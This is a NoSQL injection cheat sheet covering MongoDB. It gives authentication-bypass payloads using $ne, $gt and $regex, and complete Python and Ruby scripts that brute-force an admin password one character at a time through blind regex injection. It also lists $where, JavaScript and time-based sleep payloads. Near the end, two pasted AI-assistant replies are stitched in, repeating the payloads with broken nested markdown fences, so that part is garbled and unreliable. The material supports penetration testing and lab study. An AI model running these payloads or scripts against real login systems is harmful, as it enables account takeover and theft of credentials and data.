# NoSQL Injection

> NoSQL databases provide looser consistency restrictions than traditional SQL databases. By requiring fewer relational constraints and consistency checks, NoSQL databases often offer performance and scaling benefits. Yet these databases are still potentially vulnerable to injection attacks, even if they aren't using the traditional SQL syntax.


## Summary

* [Tools](#tools)
* [Methodology](#methodology)
    * [Authentication Bypass](#authentication-bypass)
    * [Extract Length Information](#extract-length-information)
    * [Extract Data Information](#extract-data-information)
* [Blind NoSQL](#blind-nosql)
    * [POST with JSON Body](#post-with-json-body)
    * [POST with urlencoded Body](#post-with-urlencoded-body)
    * [GET](#get)
* [Labs](#references)
* [References](#references)


## Tools

* [codingo/NoSQLmap](https://github.com/codingo/NoSQLMap) - Automated NoSQL database enumeration and web application exploitation tool
* [digininja/nosqlilab](https://github.com/digininja/nosqlilab) - A lab for playing with NoSQL Injection
* [matrix/Burp-NoSQLiScanner](https://github.com/matrix/Burp-NoSQLiScanner) - This extension provides a way to discover NoSQL injection vulnerabilities. 


## Methodology

### Authentication Bypass

Basic authentication bypass using not equal (`$ne`) or greater (`$gt`)

* in HTTP data
  ```ps1
  username[$ne]=toto&password[$ne]=toto
  login[$regex]=a.*&pass[$ne]=lol
  login[$gt]=admin&login[$lt]=test&pass[$ne]=1
  login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto
  ```

* in JSON data
  ```json
  {"username": {"$ne": null}, "password": {"$ne": null}}
  {"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
  {"username": {"$gt": undefined}, "password": {"$gt": undefined}}
  {"username": {"$gt":""}, "password": {"$gt":""}}
  ```


### Extract Length Information

Inject a payload using the $regex operator. The injection will work when the length is correct.

```ps1
username[$ne]=toto&password[$regex]=.{1}
username[$ne]=toto&password[$regex]=.{3}
```

### Extract Data Information

Extract data with "`$regex`" query operator.

* HTTP data
  ```ps1
  username[$ne]=toto&password[$regex]=m.{2}
  username[$ne]=toto&password[$regex]=md.{1}
  username[$ne]=toto&password[$regex]=mdp

  username[$ne]=toto&password[$regex]=m.*
  username[$ne]=toto&password[$regex]=md.*
  ```

* JSON data
  ```json
  {"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}
  {"username": {"$eq": "admin"}, "password": {"$regex": "^md" }}
  {"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}
  ```

Extract data with "`$in`" query operator.

```json
{"username":{"$in":["Admin", "4dm1n", "admin", "root", "administrator"]},"password":{"$gt":""}}
```


## Blind NoSQL

### POST with JSON Body

Python script:

```python
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="admin"
password=""
u="http://example.org/login"
headers={'content-type': 'application/json'}

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|']:
            payload='{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (username, password + c)
            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
            if 'OK' in r.text or r.status_code == 302:
                print("Found one more char : %s" % (password+c))
                password += c
```

### POST with urlencoded Body

Python script:

```python
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="admin"
password=""
u="http://example.org/login"
headers={'content-type': 'application/x-www-form-urlencoded'}

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|','&','$']:
            payload='user=%s&pass[$regex]=^%s&remember=on' % (username, password + c)
            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
            if r.status_code == 302 and r.headers['Location'] == '/dashboard':
                print("Found one more char : %s" % (password+c))
                password += c
```

### GET

Python script:

```python
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username='admin'
password=''
u='http://example.org/login'

while True:
  for c in string.printable:
    if c not in ['*','+','.','?','|', '#', '&', '$']:
      payload=f"?username={username}&password[$regex]=^{password + c}"
      r = requests.get(u + payload)
      if 'Yeah' in r.text:
        print(f"Found one more char : {password+c}")
        password += c
```

Ruby script:

```ruby
require 'httpx'

username = 'admin'
password = ''
url = 'http://example.org/login'
# CHARSET = (?!..?~).to_a # all ASCII printable characters
CHARSET = [*'0'..'9',*'a'..'z','-'] # alphanumeric + '-'
GET_EXCLUDE = ['*','+','.','?','|', '#', '&', '$']
session = HTTPX.plugin(:persistent)

while true
  CHARSET.each do |c|
    unless GET_EXCLUDE.include?(c)
      payload = "?username=#{username}&password[$regex]=^#{password + c}"
      res = session.get(url + payload)
      if res.body.to_s.match?('Yeah')
        puts "Found one more char : #{password + c}"
        password += c
      end
    end
  end
end
```


## Labs

* [Root Me - NoSQL injection - Authentication](https://www.root-me.org/en/Challenges/Web-Server/NoSQL-injection-Authentication)
* [Root Me - NoSQL injection - Blind](https://www.root-me.org/en/Challenges/Web-Server/NoSQL-injection-Blind)


## References

- [Burp-NoSQLiScanner - matrix - January 30, 2021](https://github.com/matrix/Burp-NoSQLiScanner/blob/main/src/burp/BurpExtender.java)
- [Les NOSQL injections Classique et Blind: Never trust user input - Geluchat - February 22, 2015](https://www.dailysecurity.fr/nosql-injections-classique-blind/)
- [MongoDB NoSQL Injection with Aggregation Pipelines - Soroush Dalili (@irsdl) - June 23, 2024](https://soroush.me/blog/2024/06/mongodb-nosql-injection-with-aggregation-pipelines/)
- [NoSQL Injection in MongoDB - Zanon - July 17, 2016](https://zanon.io/posts/nosql-injection-in-mongodb)
- [NoSQL injection wordlists - cr0hn - May 5, 2021](https://github.com/cr0hn/nosqlinjection_wordlists)
- [Testing for NoSQL injection - OWASP - May 2, 2023](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection)

# MongoDB

Here's your updated content properly formatted in GitHub-flavored Markdown (`.md`) for clean readability and sharing in a GitHub repository:

```markdown
# MongoDB Injection Payloads

```javascript
true, $where: '1 == 1'
, $where: '1 == 1'
$where: '1 == 1'
', $where: '1 == 1'
1, $where: '1 == 1'
{ $ne: 1 }
', $or: [ {}, { 'a':'a
' } ], $comment:'successful MongoDB injection'
```

```javascript
db.injection.insert({success:1});
db.injection.insert({success:1});return 1;
db.stores.mapReduce(function() { { emit(1,1
```

```javascript
|| 1==1
' && this.password.match(/.*/)//+%00
' && this.passwordzz.match(/.*/)//+%00
'%20%26%26%20this.password.match(/.*/)//+%00
'%20%26%26%20this.passwordzz.match(/.*/)//+%00
```

```json
{$gt: ''}
[$ne]=1
```

```javascript
';return 'a'=='a' && ''=='
";return(true);var xyz='a
0;return true
```

> ⚠️ These payloads are intended for educational and authorized testing purposes only. Misuse may be illegal.

```

Let me know if you'd like:
- This saved as a `.md` file
- Additional annotations or categorizations
- Included in a README template with metadata (like author, usage, references)

# NoSQL

Here's your content formatted in GitHub `.md` (Markdown) format using fenced code blocks and appropriate syntax highlighting (JavaScript or JSON where applicable). Let me know if you'd like a table or categorized list too.

```markdown
# MongoDB Injection Payloads

Below are some common and advanced MongoDB injection payloads used for testing NoSQL injection vulnerabilities.

<details>
<summary>📄 Payload Examples</summary>

```javascript
true, $where: '1 == 1'
, $where: '1 == 1'
$where: '1 == 1'
', $where: '1 == 1'
1, $where: '1 == 1'
{ $ne: 1 }
', $or: [ {}, { 'a':'a
' } ], $comment:'successful MongoDB injection'
```

```javascript
db.injection.insert({success:1});
db.injection.insert({success:1});return 1;
db.stores.mapReduce(function() { { emit(1,1
```

```javascript
|| 1==1
' && this.password.match(/.*/)//+%00
' && this.passwordzz.match(/.*/)//+%00
'%20%26%26%20this.password.match(/.*/)//+%00
'%20%26%26%20this.passwordzz.match(/.*/)//+%00
```

```json
{ "$gt": "" }
{$gt: ''}
[$ne]=1
```

```javascript
';sleep(5000);
';sleep(5000);'
';sleep(5000);+'
';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);
';return 'a'=='a' && ''=='
";return(true);var xyz='a
0;return true"
```

</details>
```
